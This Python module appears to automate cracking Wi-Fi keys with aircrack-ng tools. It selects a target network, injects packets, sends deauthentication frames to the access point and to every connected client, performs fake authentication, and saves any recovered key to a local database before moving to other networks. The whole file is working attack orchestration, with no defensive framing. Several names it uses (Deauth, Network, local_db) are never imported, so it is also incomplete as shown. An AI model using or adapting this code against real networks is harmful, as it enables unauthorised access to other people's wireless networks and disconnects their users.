import logging, time, threading

from sh import aireplay_ng, airodump_ng

from aircrack import Aircrack
from aireplay import Fakeauth, Injection
from airodump import airodump, select_target_network
from helpers import settings

logger = logging.getLogger('aircrack')

class Thread(object):
    def __init__(self, interface, exclude):
        self.interface = interface
        self.has_key = threading.Event()
        self.exclude = exclude

    def run(self):
        self.interface.ready.wait()
        self.target = select_target_network(self.interface, self.exclude)
        while self.target is None:
            logger.warning('No suitable network found for an attack, waiting %s before scanning again', settings.AIRODUMP_SCAN_WAIT_BETWEEN_FAIL)
            time.sleep(settings.AIRODUMP_SCAN_WAIT_BETWEEN_FAIL)
            self.target = select_target_network(self.interface, self.exclude)

        self.attack_start()

        while not self.aircrack_process.key and time.time() - self.attack_begin < settings.MAX_ATTACK_LENGTH:
            time.sleep(10)

        self.attack_stop()

        if self.aircrack_process.key is not None:
            network = Network(self.target['bssid'], self.target['essid'], self.aircrack_process.key)
            logger.info('Got a new key ! %s', network)
            local = local_db()
            local.add(network)
            local.commit()
            return True
        else:
            logger.warning('Attack timed out on %s, I will try another network if something else is available', self.target['essid'])
            return False

    def attack_start(self):
        logger.info('Starting attack on %s. I will try for %s seconds before giving up', self.target['essid'], settings.MAX_ATTACK_LENGTH)
        self.attack_begin = time.time()

        self.airodump_process = airodump(self.target['ch'], self.interface)

        self.aireplay_process = Injection(self.target['essid'], self.interface)

        Deauth(self.target['essid'], self.interface)
        for client in self.target['clients']:
            Deauth(self.target['essid'], self.interface, client)

        self.fakeauth_process = Fakeauth(self.target['essid'])
        self.fakeauth_process.ready.wait()
        self.aireplay_process.ready.wait()

        self.aircrack_process = Aircrack(self.target['essid'])

    def attack_stop(self):
        self.aireplay_process.terminate()
        self.fakeauth_process.terminate()
        self.airodump_process.terminate()
        self.aircrack_process.terminate()

